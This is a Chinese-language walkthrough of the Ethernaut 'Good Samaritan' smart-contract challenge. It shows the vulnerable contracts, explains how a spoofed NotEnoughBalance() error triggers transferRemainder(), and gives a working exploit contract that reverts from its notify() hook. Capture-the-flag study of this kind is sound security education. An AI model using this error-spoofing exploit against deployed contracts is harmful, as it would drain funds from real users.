## Level_27.Good Samaritan

要求：

> 排空Samaritan中所有coin;

合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

### 分析

看完题目，发现漏洞点很明显，即` requestDonation() `方法中的异常部分；

只要触发` NotEnoughBalance() `异常，就会调用` transferRemainder() `转出全部余额；

着重来看` coin.transfer() `：

```solidity
if (dest_.isContract()) {
    // notify contract
    INotifyable(dest_).notify(amount_);
}
```

发现要是合约与其交互，就会触发` notify(amount) `；所以我们需要接管` notify() `，使其触发` NotEnoughBalance() `异常即可；

[合约中如何Hook](https://docs.openzeppelin.com/contracts/3.x/extending-contracts#rules_of_hooks)；我们可以Hook` notify() `，使其触发异常；



### 攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Ethernaut.sol";

contract Exp is INotifyable {
    GoodSamaritan gs;
    error NotEnoughBalance();

    constructor(address addr){
        gs = GoodSamaritan(addr);
    }

    function Attack() public {
        gs.requestDonation();
    }

    function notify(uint256 amount) external pure virtual override  {
        if (amount == 10){
            revert NotEnoughBalance();
        }
    }
}
```

